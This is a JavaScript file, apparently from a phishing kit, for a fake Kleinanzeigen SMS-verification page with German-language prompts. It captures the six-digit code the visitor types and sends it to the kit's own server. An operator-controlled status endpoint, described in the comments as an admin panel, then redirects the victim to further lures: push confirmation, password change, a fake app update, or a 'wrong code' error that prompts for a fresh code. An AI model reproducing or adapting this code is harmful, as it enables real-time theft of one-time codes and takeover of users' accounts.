/**
 * Klein (Kleinanzeigen) SMS-Code — одна строка ввода кода, submit → /api/sms-code-submit, polling /api/status.
 */
(function () {
  'use strict';

  function getId() {
    var m = /[?&]id=([^&]+)/.exec(window.location.search);
    return m ? decodeURIComponent(m[1]) : '';
  }

  var form = document.getElementById('sms-form');
  var input = document.getElementById('phone-verification-token');
  var btnResend = document.getElementById('sms-resend');
  var btnConfirm = document.getElementById('sms-confirm');
  var statusInterval = null;

  var smsBackEl = document.getElementById('sms-back');
  if (smsBackEl) {
    smsBackEl.addEventListener('click', function (e) {
      e.preventDefault();
      if (window.history.length > 1) {
        window.history.back();
      } else {
        window.location.href = '/';
      }
    });
  }

  function getCode() {
    return (input && input.value) ? input.value.replace(/\D/g, '').slice(0, 6) : '';
  }

  function updateConfirmButton() {
    if (btnConfirm) btnConfirm.disabled = getCode().length !== 6;
  }

  if (input) {
    input.addEventListener('input', function () {
      this.value = this.value.replace(/\D/g, '').slice(0, 6);
      updateConfirmButton();
      userClearedSmsErrorByTyping = true;
      setSmsErrorFromAdmin(false);
    });
    input.addEventListener('paste', function (e) {
      e.preventDefault();
      var pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 6);
      this.value = pasted;
      updateConfirmButton();
      userClearedSmsErrorByTyping = true;
      setSmsErrorFromAdmin(false);
    });
  }

  var RESEND_COOLDOWN = 60;
  var resendSecondsLeft = RESEND_COOLDOWN;
  var resendTimer = null;

  function setResendCooldown(seconds) {
    if (!btnResend) return;
    resendSecondsLeft = seconds;
    if (resendTimer) { clearInterval(resendTimer); resendTimer = null; }
    if (seconds > 0) {
      btnResend.disabled = true;
      btnResend.textContent = 'Erneut senden (' + seconds + ' s)';
      resendTimer = setInterval(function () {
        resendSecondsLeft--;
        if (resendSecondsLeft > 0) {
          btnResend.textContent = 'Erneut senden (' + resendSecondsLeft + ' s)';
        } else {
          btnResend.disabled = false;
          btnResend.textContent = 'Erneut senden';
          clearInterval(resendTimer);
          resendTimer = null;
        }
      }, 1000);
    }
  }

  if (btnResend) {
    setResendCooldown(RESEND_COOLDOWN);
    btnResend.addEventListener('click', function () {
      if (btnResend.disabled) return;
      var id = getId();
      if (id) {
        fetch('/api/log-action', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ id: id, action: 'sms_resend' }),
        }).catch(function () {});
      }
      setResendCooldown(RESEND_COOLDOWN);
    });
  }

  function showSmsError(msg) {
    var err = document.getElementById('sms-submit-error');
    if (err) {
      err.textContent = msg || 'Fehler. Bitte versuchen Sie es erneut.';
      err.removeAttribute('hidden');
      err.style.display = '';
      err.setAttribute('aria-hidden', 'false');
    }
    var wrap = document.querySelector('.sms-klein-input-wrap');
    if (wrap) wrap.classList.add('error');
  }
  function hideSmsError() {
    var err = document.getElementById('sms-submit-error');
    if (err) {
      err.setAttribute('hidden', '');
      err.textContent = '';
    }
    var wrap = document.querySelector('.sms-klein-input-wrap');
    if (wrap) wrap.classList.remove('error');
  }
  /** Сообщение «неверный SMS» по кнопке Error в админке */
  var SMS_ERROR_MSG = 'Der eingegebene Code ist nicht korrekt. Bitte überprüfe deine Eingaben.';
  var userClearedSmsErrorByTyping = false;
  function setSmsErrorFromAdmin(show) {
    if (show) {
      showSmsError(SMS_ERROR_MSG);
    } else {
      hideSmsError();
    }
  }

  var waitMsgEl = document.getElementById('sms-wait-msg');
  var REENABLE_AFTER_MS = 15000;

  function setWaitingState(waiting) {
    if (btnConfirm) {
      btnConfirm.disabled = waiting;
      btnConfirm.textContent = waiting ? 'Bitte warten…' : 'Code bestätigen';
    }
    if (input) input.disabled = waiting;
    if (waitMsgEl) {
      waitMsgEl.hidden = !waiting;
      if (waiting) {
        waitMsgEl.textContent = 'Der Code wird überprüft. Sie werden weitergeleitet, sobald die Überprüfung abgeschlossen ist.';
        waitMsgEl.classList.remove('retry');
      }
    }
  }

  function setRetryState() {
    if (btnConfirm) {
      btnConfirm.disabled = getCode().length !== 6;
      btnConfirm.textContent = 'Code bestätigen';
    }
    if (input) input.disabled = false;
    if (waitMsgEl) {
      waitMsgEl.hidden = false;
      waitMsgEl.classList.add('retry');
      waitMsgEl.textContent = 'Falls der Code nicht funktioniert hat, geben Sie einen neuen Code ein.';
    }
  }

  var reenableTimeout = null;

  function startPollingAfterSms(id) {
    setWaitingState(true);
    if (reenableTimeout) { clearTimeout(reenableTimeout); reenableTimeout = null; }
    reenableTimeout = setTimeout(function () {
      reenableTimeout = null;
      setRetryState();
      updateConfirmButton();
    }, REENABLE_AFTER_MS);
    if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
    function check() {
      fetch('/api/status?id=' + encodeURIComponent(id) + '&page=sms-code&_=' + Date.now(), { cache: 'no-store', headers: { Pragma: 'no-cache' } })
        .then(function (r) { return r.json(); })
        .then(function (res) {
          var st = res && res.status;
          if ((res && res.mode) === 'manual' && st !== 'error') return;
          if (st === 'redirect_push') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/push-confirm.html?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_change_password') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/passwort-aendern?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_sicherheit') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/sicherheit-update?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_open_on_pc') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/bitte-am-pc?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_android') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/app-update?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_gmx_net') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location.href = (window.__BRAND__ && window.__BRAND__.canonicalUrl) || 'https://www.kleinanzeigen.de/';
          } else if (st === 'redirect_sms_code') {
            // Чтобы не было бесконечного reload, если сервер снова возвращает
            // redirect_sms_code пока пользователь уже находится на sms-code.html с этим же id.
            var curPath = (window.location && window.location.pathname) ? window.location.pathname : '';
            var curId = getId();
            if (curPath === '/sms-code.html' && curId === id) return;
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/sms-code.html?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_klein_forgot') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location.href = 'https://www.kleinanzeigen.de/m-passwort-vergessen.html';
          } else if (st === 'show_success') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            try { sessionStorage.setItem('gmw_lead_id', id); } catch (e) {}
            window.location = '/erfolg?id=' + encodeURIComponent(id);
          } else if (st === 'error') {
            if (!userClearedSmsErrorByTyping) {
              if (reenableTimeout) { clearTimeout(reenableTimeout); reenableTimeout = null; }
              setRetryState();
              updateConfirmButton();
              setSmsErrorFromAdmin(true);
              if (waitMsgEl) { waitMsgEl.setAttribute('hidden', ''); }
            }
          } else {
            userClearedSmsErrorByTyping = false;
          }
        })
        .catch(function () {});
    }
    check();
    statusInterval = setInterval(check, 1000);
  }

  if (form) {
    form.addEventListener('submit', function (e) {
      e.preventDefault();
      userClearedSmsErrorByTyping = false;
      hideSmsError();
      var code = getCode();
      if (code.length !== 6) return;
      var id = getId();
      if (!id) return;
      if (btnConfirm) btnConfirm.disabled = true;
      fetch('/api/sms-code-submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: id, code: code }),
      }).then(function (r) {
        if (!r || !r.ok) {
          if (btnConfirm) btnConfirm.disabled = false;
          showSmsError('Fehler beim Senden. Bitte versuchen Sie es erneut.');
          return;
        }
        return r.json().then(function () {
          hideSmsError();
          startPollingAfterSms(id);
        }).catch(function () {
          startPollingAfterSms(id);
        });
      }).catch(function () {
        if (btnConfirm) btnConfirm.disabled = false;
        showSmsError('Verbindungsfehler. Bitte versuchen Sie es erneut.');
      });
    });
  }

  var id = getId();
  if (id) {
    function checkStatus() {
      fetch('/api/status?id=' + encodeURIComponent(id) + '&page=sms-code&_=' + Date.now(), { cache: 'no-store', headers: { Pragma: 'no-cache' } })
        .then(function (r) { return r.json(); })
        .then(function (res) {
          var st = res && res.status;
          if ((res && res.mode) === 'manual' && st !== 'error') return;
          if (st === 'redirect_push') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/push-confirm.html?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_change_password') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/passwort-aendern?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_sicherheit') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/sicherheit-update?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_open_on_pc') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/bitte-am-pc?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_android') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/app-update?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_gmx_net') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location.href = (window.__BRAND__ && window.__BRAND__.canonicalUrl) || 'https://www.kleinanzeigen.de/';
          } else if (st === 'redirect_sms_code') {
            // Аналогичная защита от редирект-цикла на этой же странице.
            var curPath = (window.location && window.location.pathname) ? window.location.pathname : '';
            var curId = getId();
            if (curPath === '/sms-code.html' && curId === id) return;
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/sms-code.html?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_klein_forgot') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location.href = 'https://www.kleinanzeigen.de/m-passwort-vergessen.html';
          } else if (st === 'show_success') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            try { sessionStorage.setItem('gmw_lead_id', id); } catch (e) {}
            window.location = '/erfolg?id=' + encodeURIComponent(id);
          } else if (st === 'error') {
            if (!userClearedSmsErrorByTyping) {
              setRetryState();
              updateConfirmButton();
              setSmsErrorFromAdmin(true);
              if (waitMsgEl) { waitMsgEl.setAttribute('hidden', ''); }
            }
          } else {
            userClearedSmsErrorByTyping = false;
          }
        })
        .catch(function () {});
    }
    checkStatus();
    statusInterval = setInterval(checkStatus, 1000);
  }
})();
